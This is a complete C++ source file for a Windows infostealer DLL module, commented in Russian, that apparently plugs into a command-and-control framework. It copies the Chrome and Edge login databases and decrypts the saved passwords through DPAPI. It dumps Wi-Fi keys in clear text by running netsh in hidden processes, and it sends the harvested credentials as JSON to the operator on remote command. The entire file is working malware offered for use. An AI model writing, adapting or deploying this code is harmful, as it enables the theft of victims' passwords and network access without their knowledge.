// Modules/Stealer/stealer.cpp
// Компиляция: cl /LD /MT /O2 stealer.cpp /Fe:stealer.dll advapi32.lib crypt32.lib shell32.lib

#include "stealer.h"
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <shellapi.h>

#pragma comment(lib, "crypt32.lib")

// Глобальное состояние
static ModuleAPI* g_api = nullptr;
static volatile bool g_running = true;

// ============================================================================
// HELPER: Run Command & Read Output
// ============================================================================
std::string RunCommand(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    std::string fullCmd = "cmd.exe /c " + cmd;
    
    // Создаем процесс в скрытом режиме
    if (!CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return "";
    }
    
    CloseHandle(hWrite);
    CloseHandle(pi.hThread);

    char buf[4096];
    DWORD read;
    std::string result;
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, NULL) && read > 0) {
        buf[read] = 0;
        result += buf;
    }

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    return result;
}

// ============================================================================
// HELPER: DPAPI Decryption (Chrome/Edge)
// ============================================================================
std::string DecryptPassword(const char* blob, size_t len) {
    DATA_BLOB input, output;
    input.pbData = (BYTE*)blob;
    input.cbData = (DWORD)len;
    
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        std::string pass((char*)output.pbData, output.cbData);
        LocalFree(output.pbData);
        return pass;
    }
    return "";
}

// ============================================================================
// HELPER: JSON String Escaping
// ============================================================================
std::string JsonEscape(const std::string& s) {
    std::string out;
    for (char c : s) {
        if (c == '"' || c == '\\') out += '\\';
        out += c;
    }
    return out;
}

// ============================================================================
// SQLite Dynamic Loading Interface
// ============================================================================
typedef int (*sqlite3_open_func)(const char*, void**);
typedef int (*sqlite3_close_func)(void*);
typedef int (*sqlite3_prepare_v2_func)(void*, const char*, int, void**, const char**);
typedef int (*sqlite3_step_func)(void*);
typedef const unsigned char* (*sqlite3_column_text_func)(void*, int);
typedef const void* (*sqlite3_column_blob_func)(void*, int);
typedef int (*sqlite3_column_bytes_func)(void*, int);
typedef void* (*sqlite3_finalize_func)(void*);

struct SQLiteFuncs {
    sqlite3_open_func open = nullptr;
    sqlite3_close_func close = nullptr;
    sqlite3_prepare_v2_func prepare = nullptr;
    sqlite3_step_func step = nullptr;
    sqlite3_column_text_func col_text = nullptr;
    sqlite3_column_blob_func col_blob = nullptr;
    sqlite3_column_bytes_func col_bytes = nullptr;
    sqlite3_finalize_func finalize = nullptr;
};

SQLiteFuncs LoadSQLite() {
    SQLiteFuncs f;
    HMODULE h = LoadLibraryA("sqlite3.dll"); // Пытаемся загрузить системную или лежащую рядом
    if (!h) return f;
    
    // Привязка функций
    f.open = (sqlite3_open_func)GetProcAddress(h, "sqlite3_open");
    f.close = (sqlite3_close_func)GetProcAddress(h, "sqlite3_close");
    f.prepare = (sqlite3_prepare_v2_func)GetProcAddress(h, "sqlite3_prepare_v2");
    f.step = (sqlite3_step_func)GetProcAddress(h, "sqlite3_step");
    f.col_text = (sqlite3_column_text_func)GetProcAddress(h, "sqlite3_column_text");
    f.col_blob = (sqlite3_column_blob_func)GetProcAddress(h, "sqlite3_column_blob");
    f.col_bytes = (sqlite3_column_bytes_func)GetProcAddress(h, "sqlite3_column_bytes");
    f.finalize = (sqlite3_finalize_func)GetProcAddress(h, "sqlite3_finalize");

    // Если хотя бы одной нет — SQLite невалиден
    if (!f.open || !f.close || !f.step) {
        FreeLibrary(h);
        return SQLiteFuncs(); 
    }
    return f;
}

// ============================================================================
// STEALER: Browsers (Chrome/Edge)
// ============================================================================
std::string StealBrowser(const std::string& name, const std::string& path, SQLiteFuncs& sql) {
    std::string loginData = path + "\\Login Data";
    std::string tempDb = std::string(getenv("TEMP")) + "\\" + name + "_tmp.db";
    
    // Копируем БД, так как оригинал часто залочен браузером
    CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE);
    
    void* db = nullptr;
    if (sql.open(tempDb.c_str(), &db) != 0) return "";

    std::string json_arr = "[";
    void* stmt = nullptr;
    std::string query = "SELECT origin_url, username_value, password_value FROM logins";
    
    if (sql.prepare(db, query.c_str(), -1, &stmt, nullptr) == 0) {
        while (sql.step(stmt) == 100) { // SQLITE_ROW
            const char* url = (const char*)sql.col_text(stmt, 0);
            const char* user = (const char*)sql.col_text(stmt, 1);
            const void* passBlob = sql.col_blob(stmt, 2);
            int blobLen = sql.col_bytes(stmt, 2);

            std::string decrypted = "";
            if (passBlob && blobLen > 0) {
                // Попытка расшифровки DPAPI
                decrypted = DecryptPassword((const char*)passBlob, blobLen);
            }

            if (url && user) {
                json_arr += "{\"url\":\"" + JsonEscape(url) + "\",\"user\":\"" + JsonEscape(user) + "\",\"pass\":\"" + JsonEscape(decrypted) + "\"},";
            }
        }
        sql.finalize(stmt);
    }
    
    sql.close(db);
    DeleteFileA(tempDb.c_str()); // Удаляем временный файл

    if (json_arr.length() > 1) json_arr.pop_back(); // Убрать последнюю запятую
    json_arr += "]";
    return "{\"name\":\"" + name + "\",\"count\":" + std::to_string((json_arr.length() > 2) ? 1 : 0) + ",\"data\":" + json_arr + "}";
}

// ============================================================================
// STEALER: Wi-Fi
// ============================================================================
std::string StealWifi() {
    std::string profilesRaw = RunCommand("netsh wlan show profiles");
    std::string json_arr = "[";
    size_t pos = 0;
    
    // Парсинг имен профилей (строки вида "    All User Profile     : WiFiName")
    while ((pos = profilesRaw.find("All User Profile", pos)) != std::string::npos) {
        size_t colonPos = profilesRaw.find(':', pos);
        if (colonPos == std::string::npos) break;
        
        std::string profileName = profilesRaw.substr(colonPos + 2);
        // Удаляем пробелы и CR/LF
        while (!profileName.empty() && (profileName.back() == '\r' || profileName.back() == '\n' || profileName.back() == ' '))
            profileName.pop_back();

        if (!profileName.empty()) {
            std::string keyCmd = "netsh wlan show profile name=\"" + profileName + "\" key=clear";
            std::string keyOut = RunCommand(keyCmd);
            
            std::string keyContent = "Not Found";
            size_t kPos = keyOut.find("Key Content");
            if (kPos != std::string::npos) {
                size_t kColon = keyOut.find(':', kPos);
                if (kColon != std::string::npos) {
                    keyContent = keyOut.substr(kColon + 2);
                    while (!keyContent.empty() && (keyContent.back() == '\r' || keyContent.back() == '\n' || keyContent.back() == ' '))
                        keyContent.pop_back();
                }
            }
            
            json_arr += "{\"ssid\":\"" + JsonEscape(profileName) + "\",\"password\":\"" + JsonEscape(keyContent) + "\"},";
        }
        pos++;
    }
    
    if (json_arr.length() > 1) json_arr.pop_back();
    json_arr += "]";
    return json_arr;
}

// ============================================================================
// MAIN LOGIC
// ============================================================================
void ExecuteSteal(const std::string& type) {
    std::string result = "{";
    result += "\"target\":\"" + type + "\",";

    SQLiteFuncs sql = LoadSQLite();

    if (type == "steal_wifi" || type == "steal_now") {
        result += "\"wifi\":" + StealWifi() + ",";
    }

    if ((type == "steal_browsers" || type == "steal_now") && sql.open) {
        std::string appData = getenv("LOCALAPPDATA");
        std::string chrome = StealBrowser("Chrome", appData + "\\Google\\Chrome\\User Data\\Default", sql);
        std::string edge = StealBrowser("Edge", appData + "\\Microsoft\\Edge\\User Data\\Default", sql);
        result += "\"browsers\":[" + chrome + "," + edge + "],";
    } else if (type == "steal_browsers" || type == "steal_now") {
        result += "\"browsers\":[],\"error\":\"sqlite3.dll not found\",";
    }

    // Firefox (Заглушка)
    if (type == "steal_browsers" || type == "steal_now") {
        result += "\"firefox\":[{\"note\":\"Decryption requires master key / 3DES, skipped\"}]," ;
    }

    result.pop_back(); // Убрать последнюю запятую
    result += "}";

    // Отправка
    std::string payload = "STEALER_JSON:" + result; // Префикс для сервера
    g_api->send_result((const unsigned char*)payload.c_str(), payload.length());
}

DWORD WINAPI StealerWorker(LPVOID) {
    g_api->log("[Stealer] Worker started.\n");
    while (g_running) {
        Sleep(100);
        const char* cmd = g_api->get_command("stealer");
        if (cmd) {
            if (strstr(cmd, "steal_now")) {
                g_api->log("[Stealer] Command: steal_now\n");
                ExecuteSteal("steal_now");
            } else if (strstr(cmd, "steal_wifi")) {
                g_api->log("[Stealer] Command: steal_wifi\n");
                ExecuteSteal("steal_wifi");
            } else if (strstr(cmd, "steal_browsers")) {
                g_api->log("[Stealer] Command: steal_browsers\n");
                ExecuteSteal("steal_browsers");
            }
        }
    }
    g_api->log("[Stealer] Worker stopped.\n");
    return 0;
}

extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api || !api->send_result) return -1;
    g_api = api;
    g_running = true;
    
    g_api->log("[Stealer] Loaded.\n");
    api->send_result((const unsigned char*)"STEALER_READY\n", 14);
    
    CreateThread(NULL, 0, StealerWorker, NULL, 0, NULL);
    return 0;
}